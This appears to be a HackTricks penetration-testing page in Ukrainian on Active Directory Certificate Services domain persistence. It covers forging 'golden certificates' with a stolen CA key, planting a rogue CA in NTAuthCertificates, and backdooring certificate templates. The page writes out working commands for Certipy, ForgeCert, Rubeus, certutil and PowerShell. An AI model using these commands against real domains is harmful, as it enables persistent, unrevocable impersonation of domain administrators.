# AD CS Персистенція в домені

{{#include ../../../banners/hacktricks-training.md}}

**Це резюме технік персистенції в домені, описаних у [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Перегляньте його для детальнішої інформації.

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

Як визначити, що сертифікат є сертифікатом CA?

Можна встановити, що сертифікат є CA-сертифікатом, якщо виконуються кілька умов:

- Сертифікат зберігається на CA-сервері, а його приватний ключ захищений за допомогою DPAPI машини або апаратно, наприклад TPM/HSM, якщо операційна система це підтримує.
- Поля Issuer та Subject сертифіката відповідають distinguished name CA.
- Розширення "CA Version" присутнє виключно в CA-сертифікатах.
- Сертифікат не містить полів Extended Key Usage (EKU).

Для вилучення приватного ключа цього сертифіката підтримуваним методом є використання `certsrv.msc` на CA-сервері через вбудований GUI. Проте цей сертифікат не відрізняється від інших, збережених у системі; тому для його вилучення можна застосувати методи, такі як [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Сертифікат та приватний ключ також можна отримати за допомогою Certipy за допомогою наступної команди:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Після отримання сертифіката CA та його приватного ключа у форматі `.pfx`, можна використовувати інструменти на кшталт [ForgeCert](https://github.com/GhostPack/ForgeCert) для генерації дійсних сертифікатів:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Користувач, на якого спрямована підробка сертифіката, має бути активним і здатним аутентифікуватися в Active Directory, щоб процес увінчався успіхом. Підробка сертифіката для спеціальних облікових записів, таких як krbtgt, неефективна.

Цей підроблений сертифікат буде **дійсним** до зазначеної дати закінчення та доти, поки дійсний root CA certificate (зазвичай від 5 до **10+ років**). Він також дійсний для **машин**, тому у поєднанні з **S4U2Self** атакуючий може **підтримувати персистентність на будь-якій машині домену** стільки, скільки діє CA certificate.\
Крім того, **сертифікати, згенеровані** цим методом, **не можуть бути відкликані**, оскільки CA про них не знає.

### Operating under Strong Certificate Mapping Enforcement (2025+)

З 11 лютого 2025 року (після розгортання KB5014754) контролери домену за замовчуванням переходять у режим **Full Enforcement** для відображень сертифікатів. Практично це означає, що ваші підроблені сертифікати повинні або:

- Містити сильний зв'язок з цільовим обліковим записом (наприклад, SID security extension), або
- Бути поєднані зі сильною, явною відповідністю в атрибуті `altSecurityIdentities` цільового об'єкта.

Надійний підхід для персистенції — випустити підроблений сертифікат, пов'язаний у ланцюжок зі викраденим Enterprise CA, а потім додати сильну явну відповідність до victim principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Примітки
- Якщо ви можете створити підроблені сертифікати, які містять розширення безпеки SID, вони відображатимуться неявно навіть під Full Enforcement. Інакше віддавайте перевагу явним сильним відображенням. Див. [account-persistence](account-persistence.md) для детальнішої інформації про явні відображення.
- Відкликання не допомагає захисникам у цьому випадку: підроблені сертифікати невідомі базі даних CA і тому не можуть бути відкликані.

## Trusting Rogue CA Certificates - DPERSIST2

Об'єкт `NTAuthCertificates` призначений для містити один або більше **сертифікатів CA** у своєму атрибуті `cacertificate`, який використовує Active Directory (AD). Процес перевірки на боці **контролера домену** полягає в перевірці об'єкта `NTAuthCertificates` на наявність запису, що відповідає **CA, вказаному** в полі Issuer автентифікуючого **сертифіката**. Якщо відповідність знайдена, автентифікація відбувається.

Самопідписаний сертифікат CA може бути доданий до об'єкта `NTAuthCertificates` зловмисником, якщо він має контроль над цим AD-об'єктом. Зазвичай лише членам групи **Enterprise Admin**, а також **Domain Admins** або **Administrators** у **forest root’s domain** надаються права змінювати цей об'єкт. Вони можуть редагувати об'єкт `NTAuthCertificates` за допомогою `certutil.exe` з командою `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, або скориставшись [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Додаткові корисні команди для цієї техніки:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Ця можливість особливо доречна при використанні разом із раніше описаним методом, що передбачає ForgeCert для динамічного генерування сертифікатів.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Можливості для **persistence** через модифікації дескрипторів безпеки компонентів AD CS численні. Модифікації, описані в "[Domain Escalation](domain-escalation.md)" секції, можуть бути зловмисно реалізовані атаками з підвищеними привілеями. Це включає додавання «контрольних прав» (наприклад, WriteOwner/WriteDACL/etc.) до чутливих компонентів, таких як:

- The **CA server’s AD computer** object
- The **CA server’s RPC/DCOM server**
- Any **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** by default or by the organization (such as the built-in Cert Publishers group and any of its members)

Приклад зловмисної реалізації: атакувальник з **elevated permissions** у домені додає право **`WriteOwner`** до дефолтного шаблону сертифіката **`User`**, причому атакувальник є суб’єктом цього права. Щоб експлуатувати це, атакувальник спочатку змінює власника шаблону **`User`** на себе. Далі на шаблоні встановлюється **`mspki-certificate-name-flag`** значення **1**, щоб увімкнути **`ENROLLEE_SUPPLIES_SUBJECT`**, що дозволяє користувачу вказувати Subject Alternative Name у запиті. Після цього атакувальник може **enroll** за допомогою цього **template**, вибравши ім’я **domain administrator** як альтернативне ім’я, і використати отриманий сертифікат для автентифікації як DA.

Практичні налаштування, які атакувальники можуть встановити для довготривалої доменної persistence (див. {{#ref}}domain-escalation.md{{#endref}} для повних деталей і виявлення):

- CA policy flags that allow SAN from requesters (e.g., enabling `EDITF_ATTRIBUTESUBJECTALTNAME2`). This keeps ESC1-like paths exploitable.
- Template DACL or settings that allow authentication-capable issuance (e.g., adding Client Authentication EKU, enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlling the `NTAuthCertificates` object or the CA containers to continuously re-introduce rogue issuers if defenders attempt cleanup.

> [!TIP]
> У підсилених середовищах після KB5014754, поєднання цих неправильних конфігурацій із явними сильними відображеннями (`altSecurityIdentities`) гарантує, що ваші видані або підроблені сертифікати залишатимуться придатними навіть коли DCs застосовують strong mapping.



## Посилання

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
